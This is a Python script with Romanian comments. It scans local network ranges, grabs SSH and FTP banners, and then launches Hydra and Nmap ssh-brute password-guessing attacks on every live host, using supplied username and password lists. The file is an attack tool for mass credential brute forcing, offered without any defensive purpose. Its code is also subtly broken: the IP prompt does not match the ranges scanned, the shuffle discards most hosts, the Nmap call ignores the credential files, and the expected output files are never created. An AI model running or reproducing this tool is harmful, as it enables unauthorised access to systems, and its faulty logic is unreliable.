import scapy.all as scapy
import socket
import subprocess
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

# 1. Scanarea rețelei pentru IP-uri active
def scan_network(start_ip, end_ip):
    try:
        ip_list = []
        for ip in range(start_ip, end_ip + 1):
            ip_address = f"192.168.{ip}.0/24"
            arp_request = scapy.ARP(pdst=ip_address)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            for element in answered_list:
                ip_list.append(element[1].psrc)
        return ip_list
    except Exception as e:
        print(f"Error scanning network: {e}")
        return []

# 2. Salvarea IP-urilor într-un fișier
def save_ips_to_file(ip_list, filename):
    try:
        with open(filename, 'w') as file:
            for ip in ip_list:
                file.write(ip + "\n")
    except IOError as e:
        print(f"Error saving IPs to file: {e}")

# 3. Sortarea IP-urilor și eliminarea duplicatelor
def sort_and_deduplicate_ips(filename):
    try:
        with open(filename, 'r') as file:
            ips = file.readlines()
        ips = list(set(ips))  # Eliminarea duplicatelor
        ips.sort()  # Sortare
        return ips
    except IOError as e:
        print(f"Error reading IPs from file: {e}")
        return []

# 4. Amestecarea IP-urilor folosind un algoritm Fibonacci
def fibonacci_shuffle(ips):
    try:
        fib_sequence = [0, 1]
        while len(fib_sequence) < len(ips):
            fib_sequence.append(fib_sequence[-1] + fib_sequence[-2])
        shuffled_ips = [ips[i] for i in fib_sequence if i < len(ips)]
        return shuffled_ips
    except Exception as e:
        print(f"Error shuffling IPs: {e}")
        return ips

# 5. Scanarea IP-urilor pentru serviciile SSH și FTP folosind thread pool
def check_services(ip_list, ports, service_type):
    service_ips = []
    
    def check_ip(ip):
        nonlocal service_ips
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip.strip(), port))
                if result == 0:
                    banner = ""
                    if service_type == 'ssh':
                        try:
                            sock.send(b"SSH-")
                            banner = sock.recv(1024).decode('utf-8').strip()
                        except:
                            pass
                    elif service_type == 'ftp':
                        try:
                            sock.send(b"USER anonymous\r\n")
                            banner = sock.recv(1024).decode('utf-8').strip()
                        except:
                            pass
                    service_ips.append((ip.strip(), port, banner))
                sock.close()
            except Exception as e:
                print(f"Error checking {service_type} service on {ip.strip()}: {e}")
    
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            list(tqdm(executor.map(check_ip, ip_list), total=len(ip_list), desc=f"Checking {service_type} services"))
    except Exception as e:
        print(f"Error using thread pool: {e}")
    
    return service_ips

# 6. Salvarea bannerelor SSH și FTP într-un fișier
def save_service_output(service_ips, output_filename):
    try:
        with open(output_filename, 'w') as file:
            for ip, port, banner in service_ips:
                file.write(f"IP: {ip}, Port: {port}, Banner: {banner}\n")
    except IOError as e:
        print(f"Error saving service output to file: {e}")

# 7. Utilizare Hydra pentru scanare brută
def hydra_scan(ip_list, user_file, pass_file, output_file):
    try:
        temp_file = "temp_ips.txt"
        save_ips_to_file(ip_list, temp_file)
        subprocess.run(["hydra", "-L", user_file, "-P", pass_file, "-M", temp_file, "ssh"], check=True)
        os.rename("hydra_output.txt", output_file)
        os.remove(temp_file)
    except subprocess.CalledProcessError as e:
        print(f"Hydra scan failed: {e}")
    except Exception as e:
        print(f"Error during Hydra scan: {e}")

# 8. Utilizare Nmap pentru scanare brută
def nmap_scan(ip_list, user_file, pass_file, output_file):
    try:
        temp_file = "temp_ips_nmap.txt"
        save_ips_to_file(ip_list, temp_file)
        subprocess.run(["nmap", "-p", "22", "--script", "ssh-brute", "-iL", temp_file], check=True)
        os.rename("nmap_output.txt", output_file)
        os.remove(temp_file)
    except subprocess.CalledProcessError as e:
        print(f"Nmap scan failed: {e}")
    except Exception as e:
        print(f"Error during Nmap scan: {e}")

# 9. Monitorizarea progresului
def monitor_progress():
    try:
        import time
        import threading

        def progress_bar(task_name):
            for i in tqdm(range(100), desc=task_name, unit="%", leave=False):
                time.sleep(0.05)

        # Începe monitorizarea în thread-uri separate
        threading.Thread(target=progress_bar, args=("Scanning",)).start()
        threading.Thread(target=progress_bar, args=("Hydra Brute Force",)).start()
        threading.Thread(target=progress_bar, args=("Nmap Brute Force",)).start()
    except Exception as e:
        print(f"Error during progress monitoring: {e}")

if __name__ == "__main__":
    try:
        # Introducerea clasei de IP-uri și alte informații
        start_class = int(input("Enter the starting IP class (e.g., 78 for 78.0.0.0): "))
        end_class = start_class + 1
        user_file = input("Enter the path to the user list file: ")
        pass_file = input("Enter the path to the password list file: ")
        
        # Scanare rețea
        print("Scanning network...")
        ip_list = scan_network(start_class, end_class)
        save_ips_to_file(ip_list, "ips_alive.txt")

        # Sortare și eliminare duplicate
        sorted_ips = sort_and_deduplicate_ips("ips_alive.txt")
        shuffled_ips = fibonacci_shuffle(sorted_ips)
        
        # Scanare SSH și FTP
        print("Scanning for SSH services...")
        ssh_ips = check_services(shuffled_ips, [22], 'ssh')
        save_service_output(ssh_ips, "ssh_output.txt")
        
        print("Scanning for FTP services...")
        ftp_ips = check_services(shuffled_ips, [21], 'ftp')
        save_service_output(ftp_ips, "ftp_output.txt")

        # Monitorizare progres
        monitor_progress()

        # Brute Force folosind Hydra și Nmap
        print("Starting brute force with Hydra and Nmap...")
        with ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(hydra_scan, shuffled_ips, user_file, pass_file, "doneFTP.txt")
            executor.submit(nmap_scan, shuffled_ips, user_file, pass_file, "doneNMAP.txt")

    except Exception as e:
        print(f"An error occurred: {e}")
